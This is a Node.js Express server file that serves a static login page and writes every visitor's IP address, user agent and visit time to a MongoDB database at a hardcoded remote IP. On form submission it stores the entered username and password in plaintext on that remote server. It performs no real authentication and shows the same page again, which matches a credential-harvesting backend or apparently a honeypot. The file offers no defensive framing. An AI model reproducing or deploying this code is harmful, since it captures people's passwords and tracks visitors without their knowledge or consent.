const express = require('express');
const MongoClient = require('mongodb').MongoClient;
const requestIp = require('request-ip');
const url = 'mongodb://161.35.86.131:27017/userdb';
const app = express();

app.use(express.urlencoded({extended: false}));

app.get('/', (req, res) => {
    const timeNow = new Date();
    const shrtTime = timeNow.getDate() + "/" + parseInt(timeNow.getMonth()+1) + "/" + timeNow.getFullYear() + " " + timeNow.getHours() + ":" + timeNow.getMinutes() + ":" + timeNow.getSeconds();
    
    MongoClient.connect(url, {useNewUrlParser: true, useUnifiedTopology: true}, (err, db) => {
        if (err) throw err;
        const dbo = db.db("requests");
        dbo.collection("time").insertOne({ip: requestIp.getClientIp(req), time: shrtTime, ua: req.headers['user-agent'], method: req.method}, function(err, res) {
            if (err) throw err;
            db.close();
        });
    })
    
    res.sendFile(__dirname + '/static/login.html');
});

app.post('/', (req, res) => {
    const timeNow = new Date();
    const shrtTime = timeNow.getDate() + "/" + parseInt(timeNow.getMonth()+1) + "/" + timeNow.getFullYear() + " " + timeNow.getHours() + ":" + timeNow.getMinutes() + ":" + timeNow.getSeconds();
    const username = req.body.username;
    const password = req.body.password;
    
    MongoClient.connect(url, {useNewUrlParser: true, useUnifiedTopology: true}, (err, db) => {
        if (err) throw err;
        const dbo = db.db("requests");
        dbo.collection("loginAttempt").insertOne({userName: username, password: password, ip: requestIp.getClientIp(req), time: shrtTime, ua: req.headers['user-agent'], method: req.method}, function(err, res) {
            if (err) throw err;
            db.close();
        });
    })
    
    res.sendFile(__dirname + '/static/login.html');
  });

app.listen(3000, '0.0.0.0', () => console.log('Example app is listening on port 3000!'));